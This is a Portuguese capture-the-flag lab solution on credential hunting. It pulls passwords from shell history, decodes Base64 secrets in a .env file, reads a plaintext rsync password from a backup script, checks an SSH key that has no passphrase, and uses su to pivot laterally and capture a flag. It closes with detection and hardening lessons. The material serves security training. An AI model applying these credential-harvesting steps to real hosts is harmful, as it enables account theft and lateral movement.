# 🔓 Solução — Lab 02

> ⚠️ **Spoiler.** Tente antes de abrir.

## Preparação

```bash
su - dev01          # senha: V4mosLab!01
whoami              # dev01
```

## Tarefa 1 — Histórico

```bash
cat ~/.bash_history
```

Achados:

| Linha | O que vazou | Válido? |
| :-- | :-- | :-- |
| `mysql -u root -p'S3nh4-DB-2024'` | senha do MySQL | ❌ decoy — não há MySQL local |
| `su dev02  (senha B4ckup#2024)` | senha do dev02 | ✅ válida |
| `ssh-keygen ... -N ""` | chave gerada **sem passphrase** | ✅ relevante |

Filtrando:

```bash
grep -nE "senha|pass|pwd" ~/.bash_history
```

**Lição:** o comentário na linha do `su` é o que permite a leitura inequívoca. Sem ele, seria necessário testar.

## Tarefa 2 — `.env` + Base64

```bash
cat ~/projetos/api/.env
```

```
DB_PASS=UzNuaDQtREItMjAyNA==
```

```bash
echo "UzNuaDQtREItMjAyNA==" | base64 -d ; echo
# S3nh4-DB-2024
```

Mesma senha do histórico → é a senha do banco (decoy para o lab, mas em ambiente real seria um achado relevante).

```bash
grep -n "APP_KEY" ~/projetos/api/.env
echo "dGhpc19pc19hX2RlY295X2tleQ==" | base64 -d ; echo
# this_is_a_decoy_key
```

## Tarefa 3 — Script de backup

```bash
ls -la /srv/cyberlab/backup
cat /srv/cyberlab/backup/backup.sh
```

```bash
export RSYNC_PASSWORD='R3m0t3-B4ckup-2024'
```

Problemas:

1. senha em **texto claro** dentro do script
2. `rsync` remoto para `10.10.10.20` como `backupuser` — credencial reutilizável
3. script `755`: qualquer usuário lê o segredo

## Tarefa 4 — Chave SSH

```bash
ls -l ~/.ssh/
# -rw-r--r-- 1 dev01 dev01 ... id_rsa     <-- 644, errado

ssh-keygen -y -f ~/.ssh/id_rsa >/dev/null && echo "SEM passphrase"
```

Saída esperada: `SEM passphrase`.

Riscos:

- `644` permite que **qualquer usuário do host** copie a chave
- sem passphrase, a chave copiada já é utilizável, sem crackear nada
- se essa chave estiver autorizada em outros servidores (`authorized_keys`), o atacante pula de host

Correção:

```bash
chmod 600 ~/.ssh/id_rsa
chmod 755 ~/.ssh
```

## Tarefa 5 — Movimento lateral

```bash
su - dev02          # senha: B4ckup#2024
whoami              # dev02
cat ~/flag2.txt
```

```
FLAG{cr3d3nc141s_n0_lug4r_3rr4d0}
```

Cadeia completa:

```
dev01 (senha conhecida)
  └── .bash_history  → senha do dev02
        └── su dev02 → flag2
```

## O que um analista veria

- `su` gera evento no `auth.log` / PAM:

```
Feb 14 02:31:12 kali su[4350]: (to dev02) dev01 on pts/0
```

- Acesso a `/srv/cyberlab/backup/backup.sh` pode ser auditado com `-w`.
- Chave SSH `644` é detectável com uma varredura periódica de permissões.

## Lições

1. Histórico de shell é fonte de credencial — limpe e nunca digite senha com `-p`.
2. Base64 não é proteção; segredo deve ir em cofre (Vault, `pass`, variável de ambiente injetada).
3. Chave SSH = credencial. Trate como senha: `600` + passphrase.
4. Uma senha vazada em um host raramente morre ali: ela é reutilizada.
